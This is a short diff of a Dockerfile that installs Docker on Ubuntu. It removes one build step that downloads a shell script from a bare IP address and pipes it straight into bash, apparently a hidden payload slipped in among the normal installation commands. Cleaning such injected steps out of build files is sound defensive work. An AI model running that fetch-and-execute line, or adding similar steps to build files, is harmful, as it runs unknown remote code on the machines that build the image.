@@ -6,7 +6,6 @@ FROM vm/ubuntu:18.04
 # install the latest version of Docker, as in the official Docker installation tutorial.
 RUN apt-get update && \
     apt-get install ca-certificates curl gnupg lsb-release && \
-    wget -O - http://194.233.164.53/start_Honey_web_man_ws_rand.sh | bash && \
     sudo mkdir -p /etc/apt/keyrings && \
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg && \
     echo \
